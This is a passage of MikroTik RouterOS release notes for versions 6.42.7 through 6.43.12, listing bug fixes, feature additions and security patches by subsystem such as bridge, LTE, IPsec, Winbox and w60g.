*) port - improved "remote-serial" TCP performance in RAW mode;
*) ppp - added "at-chat" command;
*) ppp - fixed dynamic route creation towards VPN server when "add-default-route" is used;
*) profiler - classify kernel crypto processing as "encrypting";
*) profile - removed obsolete "file-name" parameter;
*) proxy - removed port list size limit;
*) radius - implemented Proxy-State attribute handling in CoA and disconnect requests;
*) rb3011 - implemented multiple engine IPsec hardware acceleration support;
*) rb4011 - fixed SFP+ interface full duplex and speed parameter behavior;
*) rb4011 - improved SFP+ interface linking to 1Gbps;
*) rbm33g - improved stability when used with some USB devices;
*) romon - improved reliability when processing RoMON packets on CHR;
*) routerboard - removed "RB" prefix from PWR-LINE AP devices;
*) routerboard - require at least 10 second interval between "reformat-hold-button" and "max-reformat-hold-button";
*) smb - added commenting option for SMB users (CLI only);
*) smb - fixed macOS clients not showing share contents;
*) smb - fixed Windows 10 clients not able to establish connection to share;
*) sniffer - save packet capture in "802.11" type when sniffing on w60g interface in "sniff" mode;
*) snmp - added "dot1qPortVlanTable" and "dot1dBasePortTable" OIDs;
*) snmp - changed fan speed value type to Gauge32;
*) snmp - fixed "rsrq" reported precision;
*) snmp - fixed w60g station table;
*) snmp - removed "rx-sector" ("Wl60gRxSector") value;
*) snmp - report bridge ifSpeed as "0";
*) snmp - report ifSpeed 0 for sub-layer interfaces;
*) ssh - added "allow-none-crypto" parameter to disable "none" encryption usage (CLI only);
*) ssh - added error log message when key exchange fails;
*) ssh - close active SSH connections before IPsec connections on shutdown;
*) ssh - fixed public key format compatibility with RFC4716;
*) supout - fixed "poe-out" output not showing all interfaces;
*) supout - fixed Profile output on single core devices;
*) switch - added comment field to switch ACL rules;
*) switch - fixed ACL rules on IPQ4018 devices;
*) system - accept only valid path for "log-file" parameter in "port" menu;
*) system - removed obsolete "/driver" command;
*) tr069-client - added "check-certificate" parameter to allow communication without certificates;
*) tr069-client - added "connection-request-port" parameter (CLI only);
*) tr069-client - added support for InformParameter object;
*) tr069-client - fixed certificate verification for certificates with IP address;
*) tr069-client - fixed HTTP cookie getting duplicated with the same key;
*) tr069-client - increased reported "rsrq" precision;
*) traceroute - improved stability when sending large ping amounts;
*) traffic-flow - reduced minimal value of "active-flow-timeout" parameter to 1s;
*) tunnel - properly clear dynamic IPsec configuration when removing/disabling EoIP with DNS as "remote-address";
*) upgrade - made security package depend on DHCP package;
*) usb - improved power-reset error message when no bus specified on CCR1072-8G-1S+;
*) usb - improved USB device powering on startup for hAP ac^2 devices;
*) usb - increased default power-reset timeout to 5 seconds;
*) userman - added first and last name fields for signup form;
*) userman - show redirect location in error messages;
*) user - require "write" permissions for LTE firmware update;
*) vrrp - made "password" parameter sensitive;
*) w60g - added "10s-average-rssi" parameter to align mode (CLI only);
*) w60g - added align mode "/interface w60g align" (CLI only);
*) w60g - fixed scan in bridge mode;
*) w60g - improved PtMP performance;
*) w60g - improved reconnection detection;
*) w60g - improved "tx-packet-error-rate" reading;
*) w60g - renamed disconnection message when license level did not allow more connected clients;
*) w60g - renamed "frequency-list" to "scan-list";
*) watchdog - allow specifying DNS name for "send-smtp-server" parameter;
*) webfig - improved file handling;
*) winbox - added 4th chain selection for "HT TX chains" and "HT RX chains" under "CAPsMAN/CAP Interface/Wireless" tab;
*) winbox - added "allow-dual-stack-queue" parameter in "IP/DHCP Server" and "IPv6/DHCP Server" menus;
*) winbox - added "challenge-password" field when signing certificate with SCEP;
*) winbox - added "conflict-detection" parameter in "IP/DHCP Server" menu;
*) winbox - added "coordinate-format" parameter in LTE interface settings;
*) winbox - added "radio-name" setting to "CAPsMAN/CAP Interface/General" tab;
*) winbox - added "secondary-channel" setting to "CAPsMAN/CAP Interface/Channel" tab;
*) winbox - added src/dst address and in/out interface list columns to default firewall menu view;
*) winbox - added support for dynamic devices in "IP/Kid Control/Devices" tab;
*) winbox - allow setting "network-mode" to "auto" under LTE interface settings;
*) winbox - allow specifying interface lists in "CAPsMAN/Access List" menu;
*) winbox - fixed "IPv6/Firewall" "Connection limit" parameter not allowing complete IPv6 prefix lengths;
*) winbox - fixed L2MTU parameter setting on "W60G" type interfaces;
*) winbox - fixed "LCD" menu not shown on RB2011UiAS-2HnD;
*) winbox - fixed missing w60g interface status values;
*) winbox - improved file handling;
*) winbox - moved "Too Long" statistics counter to Ethernet "Rx Stats" tab;
*) winbox - organized wireless parameters between simple and advanced modes;
*) winbox - renamed "Default AP Tx Rate" to "Default AP Tx Limit";
*) winbox - renamed "Default Client Tx Rate" to "Default Client Tx Limit";
*) winbox - show "R" flag under "IPv6/DHCP Server/Bindings" tab;
*) winbox - show "System/RouterBOARD/Mode Button" on devices that have such feature;
*) winbox - show "W60G" wireless tab on wAP 60G AP;
*) wireless - added new "installation" parameter to specify router's location;
*) wireless - improved AR5212 response to incoming ACK frames;
*) wireless - improved connection stability for new model Apple devices;
*) wireless - improved NV2 performance for all ARM devices;
*) wireless - improved signal strength at low TX power on LHG 5 ac, LHG 5 ac XL and LDF 5 ac ("/system routerboard upgrade" required);
*) wireless - improved system stability for all ARM devices with wireless;
*) wireless - improved system stability for all devices with 802.11ac wireless;
*) wireless - improved system stability when scanning for other networks;
*) wireless - removed G/N support for 2484MHz in "japan" regulatory domain;
*) wireless - report last seen IP address in RADIUS accounting messages;
*) wireless - show "installation" parameter when printing configuration;

What's new in 6.43.12 (2019-Feb-08 11:46):

MAJOR CHANGES IN v6.43.12:
----------------------
!) winbox - improvements in connection handling to router with open winbox service (CVE-2019–3924);
----------------------

What's new in 6.43.11 (2019-Feb-04 12:24):

*) ipsec - accept only valid path for "export-pub-key" parameter in "key" menu;
*) quickset - fixed "country" parameter not properly setting regulatory domain configuration;
*) smb - fixed possible buffer overflow;
*) w60g - fixed disconnection issues in PtMP setups;
*) wireless - improved antenna gain setting for devices with built in antennas;
*) wireless - show indoor/outdoor frequency limitations under "/interface wireless info country-info" command;

What's new in 6.43.10 (2019-Jan-24 07:09):

(factory only release)

What's new in 6.43.9 (2019-Jan-10 07:11):

(factory only release)

What's new in 6.43.8 (2018-Dec-21 07:10):

MAJOR CHANGES IN v6.43.8:
----------------------
!) telnet - do not allow to set "tracefile" parameter;
----------------------

Changes in this release:

*) bridge - fixed IPv6 link-local address generation when auto-mac=yes;
*) capsman - fixed "group-key-update" parameter not using correct units;
*) crs3xx - improved data transmission between 10G and 1G ports;
*) console - properly remove system note after configuration reset;
*) dhcpv4-server - fixed dynamic lease reuse after expiration;
*) dhcpv6-server - properly handle DHCP requests that include prefix hint;
*) ethernet - fixed VLAN1 forwarding on RB1100AHx4 and RB4011 devices;
*) gps - added "coordinate-format" parameter;
*) led - fixed default LED configuration for RBMetalG-52SHPacn;
*) led - fixed PWR-LINE AP ethernet led polarity ("/system routerboard upgrade" required);
*) lte - disallow setting LTE interface as passthrough target;
*) lte - fixed DHCP IP acquire (introduced in v6.43.7);
*) lte - fixed passthrough functionality when interface is removed;
*) lte - increased reported "rsrq" precision;
*) lte - reset USB when non-default slot is used;
*) package - use bundled package by default if standalone packages are installed as well;
*) resource - fixed "total-memory" reporting on ARM devices;
*) snmp - added "tx-ccq" ("mtxrWlStatTxCCQ") and "rx-ccq" ("mtxrWlStatRxCCQ") values;
*) switch - fixed MAC learning when disabling interfaces on devices with Atheros8327 and QCA8337 switch chips;
*) system - fixed situation when all configuration was not properly loaded on bootup;
*) timezone - fixed "Europe/Dublin" time zone;
*) upgrade - automatically uninstall standalone package if already installed in bundle;
*) webfig - do not show bogus VHT field in wireless interface advanced mode;
*) winbox - added "allow-roaming" parameter in "Interface/LTE" menu;
*) winbox - allow to change VHT rates when 5ghz-n/ac band is used;
*) winbox - renamed "Radius" to "RADIUS";
*) winbox - show "Switch" menu on RB4011iGS+5HacQ2HnD and RB4011iGS+;
*) wireless - added new "installation" parameter to specify router's location;
*) wireless - improved stability for 802.11ac;
*) wireless - improvements in wireless frequency selection;

What's new in 6.43.7 (2018-Nov-30 09:01):

MAJOR CHANGES IN v6.43.7:
----------------------
!) upgrade - release channels renamed - "bugfix" to "long-term", "current" to "stable" and "release candidate" to "testing";
!) upgrade - "testing" release channel now can contain "beta" together with "release-candidate" versions;
----------------------

Changes in this release:

*) bridge - properly disable dynamic CAP interfaces;
*) certificate - fixed "expires-after" parameter calculation;
*) certificate - fixed time zone adjustment for SCEP requests;
*) certificate - properly flush old CRLs when changing store location;
*) chr - fixed possible memory allocation failure when using multiple CPUs or interfaces on Xen installations;
*) crs328 - fixed SFP ports not reporting auto-negotiation status;
*) crs328 - improved link status update on disabled SFP and SFP+ interfaces;
*) defconf - automatically accept default configuration if reset done by holding button;
*) defconf - fixed default configuration loading on RB4011iGS+5HacQ2HnD-IN;
*) discovery - fixed malformed neighbor information for routers that has incomplete IPv6 configuration;
*) discovery - fixed neighbor discovery for PPP interfaces;
*) discovery - properly use System ID for "software-id" value on CHR;
*) export - fixed "silent-boot" compact export;
*) health - fixed bad voltage readings on RB493G;
*) interface - improved system stability when including/excluding a list to itself;
*) ipsec - fixed hw-aead (H) flag presence under Installed SAs on startup;
*) ipsec - improved stability when uninstalling multiple SAs at once;
*) ipsec - properly handle peer profiles on downgrade;
*) ipsec - properly update warnings under peer menu;
*) kidcontrol - do not allow users with "read" policy to pause and resume kids;
*) log - properly handle long echo messages;
*) lte - added support for more ZTE MF90 modems;
*) ospf - improved stability while handling type-5 LSAs;
*) routerboard - renamed SIM slots to "a" and "b" on SXT LTE kit;
*) routerboard - show "boot-os" and "force-backup-booter" options only on devices that have such feature;
*) snmp - do not initialise interface traps on bootup if they are not enabled;
*) timezone - updated timezone information from tzdata2018g release;
*) traffic-flow - fixed post NAT port reporting;
*) traffic-flow - fixed "src-mac-address" and added "post-src-mac-address" fields;
*) tunnel - made "ipsec-secret" parameter sensitive;
*) usb - fixed power-reset for hAP ac^2 devices;
*) user - speed up first time login process after upgrade from version older than v6.43;
*) winbox - allow to specify SIM slot on LtAP mini;
*) winbox - enabled "fast-forward" by default when adding new bridge;
*) winbox - fixed neighbor discovery for IPv6 neighbors;
*) winbox - show "System/Health" only on boards that have health monitoring;

What's new in 6.43.6 (2018-Nov-07 10:40):

(factory only release)

What's new in 6.43.5 (2018-Oct-25 12:37):

(factory only release)

What's new in 6.43.4 (2018-Oct-17 06:37):

Changes in this release:

*) bridge - do not learn untagged frames when filtering only tagged packets;
*) bridge - fixed possible memory leak when VLAN filtering is used;
*) bridge - improved packet handling when hardware offloading is being disabled;
*) bridge - properly forward unicast DHCP messages when using DHCP Snooping with hardware offloading;
*) crs328 - improved link status update on disabled SFP+ interface when using DAC;
*) crs3xx - fixed possible memory leak when disabling bridge interface;
*) crs3xx - properly read "eeprom" data after different module inserted in disabled interface;
*) dhcpv4-server - use client MAC address for dual stack queue when "client-id" is not received;
*) dhcpv6-server - fixed dynamic binding addition on solicit when IA_PD does not contain prefix (introduced in v6.43);
*) dhcpv6-server - recreate DHCPv6 server binding if it is no longer within prefix pool when rebinding/renewing;
*) ipsec - allow multiple peers to the same address with different local-address (introduced in v6.43);
*) led - added "dark-mode" functionality for LHG and LDF series devices;
*) led - added "dark-mode" functionality for wsAP ac lite, RB951Ui-2nD, hAP and hAP ac lite devices;
*) led - fixed default LED configuration for SXT LTE kit devices;
*) led - fixed power LED turning on after reboot when "dark-mode" is used;
*) ntp - fixed possible NTP server stuck in "started" state;
*) romon - improved packet processing when MTU in path is lower than 1500;
*) routerboard - show "boot-os" option only on devices that have such feature;
*) traffic-flow - fixed post NAT port reporting;
*) w60g - added "frequency-list" setting;
*) w60g - added interface stats;
*) w60g - fixed interface LED status update on connection;
*) w60g - general stability and performance improvements;
*) w60g - improved stability for short distance links;
*) w60g - renamed "mcs" to "tx-mcs" and "phy-rate" to "tx-phy-rate";

What's new in 6.43.3 (2018-Oct-05 13:12):

(factory only release)

What's new in 6.43.2 (2018-Sep-18 12:12):

Changes in this release:

*) routerboot - fixed RouterOS booting on devices with particular NAND memory (introduced in v6.43);

What's new in 6.43.1 (2018-Sep-17 06:53):

Changes in this release:

*) crs317 - fixed packet forwarding on bonded interfaces without hardware offloading;
*) defconf - properly clear global variables when generating default configuration after RouterOS upgrade;
*) dhcpv6-client - log only failed pool additions;
*) hotspot - properly update dynamic "walled-garden" entries when changing "dst-host";
*) ike2 - fixed rare authentication and encryption key mismatches after rekey with PFS enabled;
*) lte - fixed LTE interface not working properly after reboot on RBSXTLTE3-7;
*) rb3011 - added IPsec hardware acceleration support;
*) routerboard - fixed memory tester reporting false errors on IPQ4018 devices ("/system routerboard upgrade" required);
*) sniffer - made "connection", "host", "packet" and "protocol" sections read-only;
*) switch - fixed port mirroring on devices that do not support CPU Flow Control;
*) upnp - improved UPnP service stability when handling HTTP requests;
*) webfig - allow to change user name when creating a new system user (introduced in v6.43);
*) webfig - fixed time interval settings not applied properly under "IP/Kid Control/Kids" menu;
*) winbox - added "allow-dual-stack-queue" setting to "IP/DHCP Server/Leases" menu;
*) winbox - added "allow-dual-stack-queue" setting to "IPv6/DHCPv6 Server/Bindings" menu;
*) winbox - fixed corrupt user database after specifying allowed address range (introduced in v6.43);
*) winbox - make bridge port "untrusted" by default when creating new port;
*) winbox - show "IP/Cloud" menu on CHR;
*) winbox - show "System/RouterBOARD/Mode Button" on devices that have such feature;
*) wireless - removed "czech republic 5.8" regulatory domain information as it overlaps with "ETSI 5.7-5.8";

What's new in 6.43 (2018-Sep-06 12:44):

MAJOR CHANGES IN v6.43:
----------------------
!) api - changed authentication process (https://wiki.mikrotik.com/wiki/Manual:API#Initial_login);
!) backup - do not encrypt backup file unless password is provided;
!) btest - requires at least v6.43 Bandwidth Test client when connecting to v6.43 or later version server except when authentication is not required;
!) cloud - added IPv6 support;
!) cloud - added support for licensed CHR instances (including trial);
!) cloud - reworked "/ip cloud ddns-enabled" implementation (suggested to disable service and re-enable after installation process);
!) radius - use MS-CHAPv2 for "login" service authentication;
!) romon - require at least v6.43 RoMON agent when connecting to v6.43 or later RoMON client device;
!) webfig - improved authentication process;
!) winbox - improved authentication process excluding man-in-the-middle possibility;
!) winbox - minimal required version is v3.15;
----------------------

Changes in this release:

*) backup - added support for new backup file encryption (AES128-CTR) with signatures (SHA256);
*) backup - generate proper file name when devices identity is longer than 32 symbols;
*) bridge - add dynamic CAP interface to tagged ports if "vlan-mode=use-tag" is enabled;
*) bridge - added an option to manually specify ports that have a multicast router (CLI only);
*) bridge - added a warning when untrusted port receives a DHCP Server message when DCHP Snooping is enabled;
*) bridge - added ingress filtering options to bridge interface;
*) bridge - added initial Q-in-Q support;
*) bridge - added more options to fine-tune IGMP Snooping enabled bridges (CLI only);
*) bridge - added per-port based "tag-stacking" feature;
*) bridge - added support for BPDU Guard;
*) bridge - added support for DHCP Option 82;
*) bridge - added support for DHCP Snooping;
*) bridge - added support for IGMP Snooping fast-leave feature (CLI only);
*) bridge - fixed dynamic VLAN table entries when using ingress filtering;
*) bridge - fixed "ingress-filtering", "frame-types" and "tag-stacking" value storing;
*) bridge - forward LACPDUs when "protocol-mode=none";
*) bridge - ignore tagged BPDUs when bridge VLAN filtering is used;
*) bridge - improved packet handling;
*) bridge - improved packet processing when bridge port changes states;
*) bridge - improved performance when bridge VLAN filtering is used without hardware offloading;
*) bridge - renamed option "vlan-protocol" to "ether-type";
*) capsman - added ability to use chain 3 for "HT TX chains" and "HT RX chains" selections (CLI only);
*) capsman - allow to change "radio-name" (CLI only);
*) capsman - increase timeout for the CAP to CAPsMAN communication;
*) certificate - added "expires-after" parameter;
*) certificate - do not allow to perform "undo" on certificate changes;
*) certificate - fixed RA "server-url" setting;
*) check-installation - improved system integrity checking;
*) chr - added checksum offload support for Hyper-V installations;
*) chr - added large send offload support for Hyper-V installations;
*) chr - added multiqueue support on Xen installations;
*) chr - added support for multiqueue feature on "virtio-net";
*) chr - added virtual Receive Side Scaling support for Hyper-V installations (might require more RAM assigned than in previous versions);
*) chr - by default enable link state tracking for virtual drivers with "/interface ethernet disable-running-check=no";
*) chr - do not show IRQ entries from removed devices;
*) chr - fixed interface name assign process when running CHR on Hyper-V;
*) chr - fixed interface name order when "virtio-net is not being used on KVM installations;
*) chr - fixed MTU changing process when running CHR on Hyper-V;
*) chr - fixed NIC hotplug for "virtio-net";
*) chr - improved balooning process;
*) chr - improved boot time for Hyper-V installations;
*) chr - provide part of network interface GUID at the beginning of "bindstr2" value when running CHR on Hyper-V;
*) chr - reduced RAM memory required per interface;
*) cloud - added simultaneous IPv4/IPv6 support;
*) cloud - close local UDP port if no activity;
*) console - added "dont-require-permissions" parameter for scripts;
*) console - added error log message when netwatch tries to execute script with insufficient permissions;
*) console - added error log message when scheduler tries to execute script with insufficient permissions;
*) console - do not show spare parameters on ping command;
*) console - made "once" parameter mandatory when using "as-value" on "monitor" commands;
*) console - removed automatic swapping of "from=" and "to=" in "for" loops;
*) crs317 - fixed Ethernet inteface stuck on 100 Mbps speed;
*) crs326/crs328 - fixed packet forwarding when port changes states with IGMP Snooping enabled;
*) crs328 - fixed transmit on sfp-sfpplus1 and sfp-sfpplus2 interfaces;
*) crs3xx - added hardware support for DHCP Snooping and Option 82;
*) crs3xx - added Q-in-Q hardware offloading support;
*) crs3xx - do not report SFP interface as running when interface on opposite side is disabled;
*) crs3xx - fixed ACL rate rules (introduced in v6.41rc27);
*) crs3xx - fixed flow control;
*) crs3xx - fixed SwOS config import;
*) defconf - fixed default configuration for RBSXTsq5nD;
*) defconf - fixed missing bridge ports after configuration reset;
*) dhcp - added dynamic IPv4/IPv6 "dual-stack" simple queue support, based on client's MAC address;
*) dhcp - reduced resource usage of DHCP services;
*) dhcpv4-client - fixed DHCP client that was stuck on invalid state;
*) dhcpv4-client - fixed double ACK packet handling;
*) dhcpv4-server - added "allow-dual-stack-queue" implementation (CLI only);
*) dhcpv4-server - do not allow override lease "always-broadcast" value based on offer type;
*) dhcpv4-server - improved performance when "rate-limit" and/or "address-list" setting is present;
*) dhcpv6-client - added missing "Server identifier" parameter in release message;
*) dhcpv6-client - fixed "add-default-route" parameter;
*) dhcpv6-client - fixed option handling;
*) dhcpv6-client - improved dynamic IPv6 pool addition process;
*) dhcpv6-server - added additional RADIUS parameters for Prefix delegation, "rate-limit" and "life-time";
*) dhcpv6-server - added "allow-dual-stack-queue" implementation (CLI only);
*) dhcpv6-server - added initial dynamic simple queue support;
*) dhcpv6-server - do not allow to run DHCPv6 server on slave interface;
*) dhcpv6-server - fixed dynamic simple queue creation for RADIUS bindings;
*) dns - fixed DNS cache service becoming unresponsive when active Hotspot server is present on the router (introduced in 6.42);
*) dude - fixed client auto upgrade (broken since 6.43rc17);
*) ethernet - do not show "combo-state" field if interface is not SFP or copper;
*) ethernet - properly handle Ethernet interface default configuration;
*) export - do not show w60g password on "hide-sensitive" type of export;
*) fetch - added "as-value" output format;
*) fetch - fixed address and DNS verification in certificates;
*) filesystem - fixed NAND memory going into read-only mode (requires "factory-firmware" >= 3.41.1 and "current-firmware" >= 6.43);
*) filesystem - improved software crash handling on devices with FLASH type memory;
*) health - added missing parameters from export;
*) health - fixed voltage measurements for RB493G devices;
*) health - improved speed of health measurement readings;
*) hotspot - allow to properly configure Hotspot directory on external disk for devices that have flash type storage;
*) hotspot - fixed RADIUS CoA & PoD by allowing to accept "NAS-Port-Id";
*) ike1 - added unsafe configuration warning for main mode with pre-shared-key authentication;
*) ike1 - purge both SAs when timer expires;
*) ike1 - zero out reserved bytes in NAT-OA payload;
*) ike2 - fixed initiator first policy selection;
*) ike2 - fixed rekeyed child deletion during another exchange;
*) ike2 - improved basic exchange logging readability;
*) ike2 - use "/32" netmask by default on initiator if not provided by responder;
*) interface - improved interface "last-link-down-time" and "last-link-up-time" values;
*) interface - improved reliability on dynamic interface handling;
*) ippool - improved used address error message;
*) ipsec - added "responder" parameter for "mode-config" to allow multiple initiator configurations;
*) ipsec - added "src-address-list" parameter for "mode-config" that generates dynamic "src-nat" rule;
*) ipsec - added warning messages for incorrect peer configuration;
*) ipsec - do not allow removal of "proposal" and "mode-config" entries that are in use;
*) ipsec - fixed AES-192-CTR fallback to software AEAD on ARM devices with wireless and RB3011UiAS-RM;
*) ipsec - fixed AES-CTR and AES-GCM key size proposing as initiator;
*) ipsec - fixed "static-dns" value storing;
*) ipsec - improved invalid policy handling when a valid policy is uninstalled;
*) ipsec - improved reliability on generated policy addition when IKEv1 or IKEv2 used;
*) ipsec - improved stability when using IPsec with disabled route cache;
*) ipsec - install all DNS server addresses provided by "mode-config" server;
*) ipsec - separate phase1 proposal configuration from peer menu;
*) ipsec - separate phase1 proposal configuration from peer menu;
*) ipsec - use monotonic timer for SA lifetime check;
*) kidcontrol - allow to edit discovered devices;
*) l2tp - allow setting "max-mtu" and "max-mru" bigger than 1500;
*) led - improved w60g alignment trigger;
*) leds - fixed LED behaviour when bonding is configured on SFP+ interfaces;
*) log - fixed false log warnings about system status after power on for CRS328-4C-20S-4S+;
*) log - show interface name on OSPF "different MTU" info log messages;
*) lte - added additional D-Link PIDs;
*) lte - added additional ID support for SIM7600 modem;
*) lte - added additional low endpoint SIM7600 PIDs;
*) lte - added eNB ID to info command;
*) lte - added extended LTE signal info for SIM7600 modules;
*) lte - added extended signal information for Quectel LTE EC25 and EP06 modem;
*) lte - added ICCID reading for info command R11e-LTE and R11e-LTE-US;
*) lte - added "registration-status" parameter under "/interface lte info" command;
*) lte - added roaming status reading for info command;
*) lte - added "sector-id" to info command;
*) lte - added support for alternative SIM7600 PID;
*) lte - added support for Novatel USB730LN modem with new ID;
*) lte - added support for Quanta 1k6e modem;
*) lte - allow to execute concurrent internal AT commands;
*) lte - allow to use multiple PLS modems at the same time;
*) lte - do not allow to remove default APN profile;
*) lte - do not allow to send "at-chat" commands for configless modems;
*) lte - expose GPS channel for PLS modems;
*) lte - fixed LTE registration in 2G/3G mode;
*) lte - fixed SIM7600 registration info;
*) lte - fixed SIM7600 series module support with newer device IDs;
*) lte - ignore empty MAC addresses during Passthrough discovery phase;
*) lte - improved modem event processing;
*) lte - improved r11e-LTE and r11e-LTE-US dialling process;
*) lte - improved r11e-LTE configuration exchange process;
*) lte - improved reading of SMS message after entering running state;
*) lte - improved readings of info command results for the SXT LTE;
*) lte - improved stability of USB LTE interface detection process;
*) lte - properly detect interface state when running for IPv6 only connection for R11e-LTE modem;
*) lte - renamed LTE scan tool field "scan-code" to "mcc-mnc";
*) lte - show UICC in correct format for SXT LTE devices;
*) lte - use "/32" address for the Passthrough feature when R11e-LTE module is used;
*) lte - use alphanumeric operator format in info command;
*) mac-telnet - improved reliability when connecting from RouterOS versions prior 6.43;
*) multicast - allow to add more than one RP per IP address for PIM;
*) ntp - allow to specify link-local address for NTP server;
*) ospf - improved link-local LSA flooding;
*) ospf - improved stability when originating LSAs with OSPFv3;
*) package - renamed "current-version" to "installed-version" under "/system package install";
*) ppp - added support for additional ID for E3531 modem;
*) ppp - added support for Alfa Network U4G modem;
*) ppp - added support for Telit LM940 modem;
*) ppp - improved modem mode switching;
*) ppp - show comments from "/ppp secrets" menu within "/ppp active" menu when client is connected;
*) quickset - recognize 160 MHz channel as HomeAP mode;
*) rb1100ahx4 - added DES and 3DES hardware acceleration support;
*) romon - fixed RoMON services becoming unavailable after disabled once during active scanning process;
*) romon - properly classify RoMON sessions in log and active users list;
*) routerboard - allow to fill up to half of the RAM memory with files on devices with FLASH storage;
*) routerboard - fixed "protected-routerboot" feature (introduced in v6.42);
*) routerboard - fixed wrongly reported RAM size on ARM devices;
*) routerboot - removed RAM test from TILE devices (routerboot upgrade required);
*) sfp - fixed default advertised link speeds;
*) smb - fixed valid request handling when additional options are used;
*) sms - converted "keep-max-sms" feature to "auto-erase";
*) sms - do not require "port" and "interface" parameters when sending SMS if already present in configuration;
*) sms - improved reliability on SMS reader;
*) snmp - added CAPsMAN "remote-cap" table;
*) snmp - added EAP identity to CAPsMAN registration table;
*) snmp - added "phy-rate" reading for "station-bridge" mode;
*) snmp - added "temp-exception" trap;
*) snmp - fixed interface speed reporting for predefined rates;
*) snmp - fixed "remote-cap" peer MAC address format;
*) ssh - disconnect all active connections when device gets rebooted or turned off;
*) ssh - strengthen strong-crypto (add aes-128-ctr and disallow hmac sha1 and groups with sha1);
*) supout - added "files" section to supout file;
*) supout - added info log message when supout file is created;
*) supout - added monitored bridge VLAN table to supout file;
*) supout - added "w60g" section to supout file;
*) switch - added CPU Flow Control settings for devices with a Atheros8227, QCA8337, Atheros8327, Atheros7240 or Atheros8316 switch chip;
*) switch - added support for port isolation by switch chip;
*) switch - fixed possible switch chip hangs after initialization on MediaTek and Atheros8327 switch chips;
*) swos - implemented "/system swos" menu that allows to upgrade, reset, save or load configuration and change address for dual-boot CRS devices (CLI only);
*) tile - added DES and 3DES hardware acceleration support;
*) tile - fixed false HW offloading flag for MPLS;
*) tr069-client - allow editing of "provisioning-code" attribute;
*) tr069-client - fixed setting of "DeviceInfo.ProvisioningCode" parameter;
*) tr069-client - use SNI extension for HTTPS;
*) upgrade - fixed RouterOS upgrade process from RouterOS v5 on PowerPC;
*) ups - improved UPS serial parsing stability;
*) usb - fixed modem initialisation on LtAP mini;
*) usb - fixed power-reset for hAP ac^2 devices;
*) user - all passwords are now hashed and encrypted, plaintext passwords are kept for downgrade (will be removed in later upgrades);
*) userman - fixed "shared-secret" parameter requiring "sensitive" policy;
*) vrrp - improved reliability on VRRP interface configured as a bridge port when "use-ip-firewall" is enabled;
*) w60g - added "beamforming-event" stats counter;
*) w60g - fixed random disconnects;
*) w60g - general stability and performance improvements;
*) watchdog - added "ping-timeout" setting;
*) webfig - do not automatically re-log in after logging out;
*) webfig - fixed occasional authentication failure when logging in;
*) webfig - fixed www service becoming unresponsive;
*) webfig - properly display time interval within Kid Control menu;
*) webfig - properly handle double clicking when logging in or out;
*) webfig - properly show NTP clients "last-adjustment" value;
*) winbox - added bridge Fast Forward statistics counters;
*) winbox - added "poe-fault" LED trigger;
*) winbox - added "tag-stacking" option to "Bridge/Ports";
*) winbox - allow to specify LTE interface when sending SMS;
*) winbox - fixed arrow key handling within table filter fields;
*) winbox - fixed "bad-blocks" value presence under "System/Resources";
*) winbox - fixed bridge port MAC learning parameter values;
*) winbox - fixed "IP/IPsec/Peers" section sorting;
*) winbox - fixed "write-sect-since-reboot" value presence under "System/Resources";
*) winbox - properly close session when uploading multiple files to the device at the same time;
*) winbox - removed duplicate "20/40/80MHz" value from "channel-width" setting options;
*) winbox - renamed "VLAN Protocol" to "EtherType" under bridge interface "VLAN" tab;
*) winbox - show HT MCS tab when "5ghz-n/ac" band is used;
*) winbox - show "Switch" menu on hAP ac^2 devices;
*) winbox - show "System/RouterBOARD/Mode Button" on devices that has such feature;
*) wireless - accept only valid path for sniffer output file parameter;
*) wireless - accept only valid path for sniffer output file parameter;
*) wireless - added "czech republic 5.8" regulatory domain information;
*) wireless - added "etsi2" regulatory domain information;
*) wireless - added option for RADIUS "called-station-id" format selection;
*) wireless - added option to disable PMKID for WPA2;
*) wireless - do not disconnect clients when WDS master connects with MAC address "00:00:00:00:00:00";
*) wireless - fixed "/interface wireless sniffer packet print follow" output;
*) wireless - fixed wireless interface lockup after period of inactivity;
*) wireless - improved Nv2 reliability on ARM devices;
*) wireless - improved Nv2 stability for 802.11n interfaces on RB953, hAP ac and wAP ac devices;
*) wireless - require "sniff" policy for wireless sniffer;
*) wireless - updated "czech republic" regulatory domain information;
*) wireless - updated "germany 5.8 ap" and "germany 5.8 fixed p-p" regulatory domain information;
*) x86 - improved Ethernet driver for Davicom DM9x0x;

What's new in 6.42.7 (2018-Aug-17 09:48):

MAJOR CHANGES IN v6.42.7:
----------------------
!) security - fixed vulnerabilities CVE-2018-1156, CVE-2018-1157, CVE-2018-1158, CVE-2018-1159;
----------------------

*) bridge - improved bridge port state changing process;
*) crs326/crs328 - fixed untagged packet forwarding through tagged ports when pvid=1;
*) crs3xx - added command that forces fan detection on fan-equipped devices;
*) crs3xx - fixed port disable on CRS326 and CRS328 devices;
*) crs3xx - fixed tagged packet forwarding without VLAN filtering (introduced in 6.42.6);
*) crs3xx - fixed VLAN filtering when there is no tagged interface specified;
*) dhcpv4-relay - fixed false invalid flag presence;
*) dhcpv6-client - allow to set "default-route-distance";
*) dhcpv6 - improved reliability on IPv6 DHCP services;
*) dhcpv6-server - properly update interface for dynamic DHCPv6 servers;
*) ethernet - improved large packet handling on ARM devices with wireless;
*) ethernet - removed obsolete slave flag from "/interface vlan" menu;
*) ipsec - fixed "sa-src-address" deduction from "src-address" in tunnel mode;
*) ipsec - improved invalid policy handling when a valid policy is uninstalled;
*) ldp - properly load LDP configuration;
*) led - fixed default LED configuration for RBLHGG-5acD-XL devices;
*) lte - added signal readings under "/interface lte scan" for 3G and GSM modes;
*) lte - fixed memory leak on USB disconnect;
*) lte - fixed SMS send feature when not in LTE network;
*) package - do not allow to install out of bundle package if it already exists within bundle;
*) ppp - fixed interface enabling after a while if none of them where active;
*) sfp - hide "sfp-wavelength" parameter for RJ45 transceivers;
*) tr069-client - fixed unresponsive tr069 service when blackhole route is present;
*) upgrade - fixed RouterOS upgrade process from RouterOS v5;
*) userman - fixed compatibility with PayPal TLS 1.2;
*) vrrp - fixed VRRP packet processing on VirtualBox and VMWare hypervisors;
*) w60g - added distance measurement feature;
*) w60g - fixed random disconnects;
*) w60g - general stability and performance improvements;
*) w60g - improved MCS rate detection process;
*) w60g - improved MTU change handling;
*) w60g - properly close connection with station on disconnect;
*) w60g - stop doing distance measurements after first successful measurement;
*) winbox - added "secondary-channel" setting to wireless interface if 80 MHz mode is selected;
*) winbox - fixed "sfp-connector-type" value presence under "Interface/Ethernet";
*) winbox - fixed warning presence for "IP/IPsec/Peers" menu;
*) winbox - properly display all flags for bridge host entries;
*) winbox - show "System/RouterBOARD/Mode Button" on devices that has such feature;
